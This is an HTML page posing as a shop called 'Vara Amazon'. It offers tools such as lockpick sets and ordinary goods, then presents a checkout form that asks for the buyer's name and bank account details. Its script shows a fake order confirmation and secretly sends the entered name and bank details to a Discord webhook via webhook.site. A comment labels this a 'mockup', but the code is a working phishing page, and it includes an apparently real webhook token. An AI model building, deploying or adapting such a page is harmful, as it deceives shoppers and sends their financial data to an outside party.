<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vara Amazon</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2c2c2c;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
            background: #333;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }

        h1 {
            margin-bottom: 20px;
            font-size: 2.5em;
            color: #f4f4f4;
        }

        #search-bar {
            width: 80%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #555;
            border-radius: 5px;
            background-color: #444;
            color: white;
        }

        .buttons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 20px;
        }

        .category-btn {
            padding: 15px 30px;
            font-size: 1.2em;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .category-btn:hover {
            background-color: #0056b3;
        }

        .items {
            margin-top: 20px;
        }

        .item-btn {
            display: block;
            margin: 10px 0;
            padding: 10px 20px;
            font-size: 1.1em;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .item-btn:hover {
            background-color: #218838;
        }

        .form-container {
            text-align: left;
            width: 300px;
            margin: 0 auto;
        }

        .form-container label {
            display: block;
            margin: 10px 0 5px;
        }

        .form-container input[type="text"], .form-container textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #555;
            border-radius: 5px;
            background-color: #444;
            color: white;
        }

        .submit-btn {
            width: 100%;
            padding: 10px;
            font-size: 1.2em;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .submit-btn:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Vara Amazon</h1>
        <input type="text" id="search-bar" placeholder="Search for a category...">
        <div class="buttons">
            <button class="category-btn" onclick="showCategory('tools')">Tools</button>
            <button class="category-btn" onclick="showCategory('food')">Food</button>
            <button class="category-btn" onclick="showCategory('more')">More</button>
        </div>
        <div id="items" class="items"></div>
    </div>

    <script>
        function showCategory(category) {
            const itemsDiv = document.getElementById('items');
            itemsDiv.innerHTML = ''; // Clear previous items

            const tools = ["Bolt cutters", "Lockpick sets", "Padlocks", "Axes", "Knives", "Shovels", "Hoes"];
            const food = ["Apple", "Banana", "Carrot", "Bread", "Milk"];
            const more = ["Books", "Clothes", "Electronics", "Furniture", "Toys"];

            let items = [];

            switch (category) {
                case 'tools':
                    items = tools;
                    break;
                case 'food':
                    items = food;
                    break;
                case 'more':
                    items = more;
                    break;
            }

            items.forEach(item => {
                const button = document.createElement('button');
                button.className = 'item-btn';
                button.textContent = item;
                button.onclick = () => showItemVariants(item);
                itemsDiv.appendChild(button);
            });
        }

        function showItemVariants(item) {
            const itemsDiv = document.getElementById('items');
            itemsDiv.innerHTML = ''; // Clear previous items

            let variants = [];

            switch (item) {
                case 'Shovels':
                    variants = ["Basic Shovel", "Heavy-Duty Shovel", "Collapsible Shovel"];
                    break;
                case 'Hoes':
                    variants = ["Garden Hoe", "Stirrup Hoe", "Heavy-Duty Hoe"];
                    break;
                case 'Knives':
                    variants = ["Chef Knife", "Hunting Knife", "Utility Knife"];
                    break;
                case 'Lockpick sets':
                    variants = ["Beginner Lockpick Set", "Professional Lockpick Set", "Advanced Lockpick Set"];
                    break;
                default:
                    variants = [item];
            }

            variants.forEach(variant => {
                const button = document.createElement('button');
                button.className = 'item-btn';
                button.textContent = variant;
                button.onclick = () => goToCustomerForm(variant);
                itemsDiv.appendChild(button);
            });
        }

        function goToCustomerForm(item) {
            document.body.innerHTML = `
                <div class="container">
                    <h1>Enter Your Details for ${item}</h1>
                    <div class="form-container">
                        <label for="name">Name:</label>
                        <input type="text" id="name" placeholder="Your Name">

                        <label for="bank-details">Bank Account Details:</label>
                        <textarea id="bank-details" rows="4" placeholder="Your Bank Account Details"></textarea>

                        <button class="submit-btn" onclick="submitOrder('${item}')">Buy</button>
                    </div>
                </div>
            `;
        }

        function submitOrder(item) {
            const name = document.getElementById('name').value;
            const bankDetails = document.getElementById('bank-details').value;

            if (name && bankDetails) {
                const orderNumber = Math.floor(Math.random() * 1000000);
                alert(`Thank you for your purchase of ${item}! Your order number is #${orderNumber}.`);

                // Send webhook with details (this is a mockup example)
                fetch('https://webhook.site/https://discord.com/api/webhooks/1280978020026417303/N6_0RI7IzLcVkYjHnkDqVWNHnxfycklVvwBiqlXqdXCwkg2dGMKcQoipOFvjFaShJTqQ', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        orderNumber: orderNumber,
                        item: item,
                        customerName: name,
                        bankDetails: bankDetails
                    })
                }).then(response => console.log('Webhook sent:', response));
            } else {
                alert('Please fill in all the fields.');
            }
        }

        // Implement search functionality
        document.getElementById('search-bar').addEventListener('input', function() {
            const query = this.value.toLowerCase();
            const buttons = document.querySelectorAll('.category-btn');

            buttons.forEach(button => {
                if (button.textContent.toLowerCase().includes(query)) {
                    button.style.display = '';
                } else {
                    button.style.display = 'none';
                }
            });
        });
    </script>
</body>
</html>
